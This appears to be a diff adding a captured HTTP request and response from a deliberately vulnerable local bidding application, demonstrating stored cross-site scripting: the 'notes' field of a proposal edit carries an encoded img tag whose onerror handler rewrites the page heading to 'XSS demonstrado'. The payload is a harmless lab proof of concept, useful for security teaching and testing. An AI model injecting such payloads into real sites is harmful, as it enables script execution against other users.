@@ -1,0 +1,32 @@
+POST http://127.0.0.1:3000/propostas/1/editar HTTP/1.1
+Host: 127.0.0.1:3000
+Proxy-Connection: keep-alive
+Content-Length: 209
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="158", "Not.A/Brand";v="24", "Google Chrome";v="158"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36
+Origin: http://127.0.0.1:3000
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:3000/propostas/1/editar
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: licita_vulneravel=3ac3269f34a2042ccc4dd9d34b5ee586897083afb7263184aeb468419e56ebe0
+
+_csrf=7bf8962bd640b2d541af349ae27c67d4742dcd696646dd60&value=172800.00&notes=%3Cimg+src%3D%22%2Fimagem-inexistente%22+onerror%3D%22document.querySelector%28%27h1%27%29.textContent%3D%27XSS+demonstrado%27%22%3EHTTP/1.1 303 See Other
+cache-control: no-store
+x-content-type-options: nosniff
+x-frame-options: DENY
+referrer-policy: same-origin
+location: /propostas/1
+content-length: 0
+Date: Fri, 27 Nov 2026 02:44:47 GMT
+Connection: keep-alive
+Keep-Alive: timeout=72
+
